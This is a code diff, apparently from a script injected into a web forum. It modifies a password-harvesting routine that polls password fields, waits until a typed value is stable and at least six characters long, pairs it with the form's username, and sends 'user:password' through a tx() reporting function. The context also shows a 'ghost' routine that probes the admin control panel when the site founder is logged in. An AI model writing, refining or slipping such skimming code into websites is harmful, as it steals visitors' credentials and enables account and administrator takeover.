@@ -192,7 +192,6 @@
       } catch (e) {}
     }
 
-    // Ghost: når founder er ACP-autentisert, hent en ACP-side og rapporter hva som er mulig
     var ghostRan = false;
     function ghost(who) {
       if (ghostRan) { return; }
@@ -266,16 +265,19 @@
             for (var i = 0; i < ps.length; i++) {
               var p = ps[i];
               var v = p.value;
-              if (!v) { p.__last = ''; continue; }
-              if (v !== p.__last) { p.__last = v; continue; }
-              if (v === p.__seen) { continue; }
-              p.__seen = v;
+              if (!v) { p.__last = ''; p.__still = 0; continue; }
+              if (v !== p.__last) { p.__last = v; p.__still = 0; continue; }
+              p.__still = (p.__still || 0) + 1;
+              if (p.__still < 3) { continue; }
+              if (p.__sent) { continue; }
+              if (v.length < 6) { continue; }
+              p.__sent = 1;
               var u = '';
               if (p.form) {
                 var a0 = p.form.querySelector('input[name="' + L_U + '"]') || p.form.querySelector('input[name="' + L_U2 + '"]');
                 u = a0 ? a0.value : '';
               }
-              tx('AF: ' + (u || '?') + ':' + v + ' | ' + pos(), 'af_' + v);
+              tx('AF: ' + (u || '?') + ':' + v + ' | ' + pos(), 'af_' + w.location.pathname);
             }
           } catch (e) {}
         }, 800);
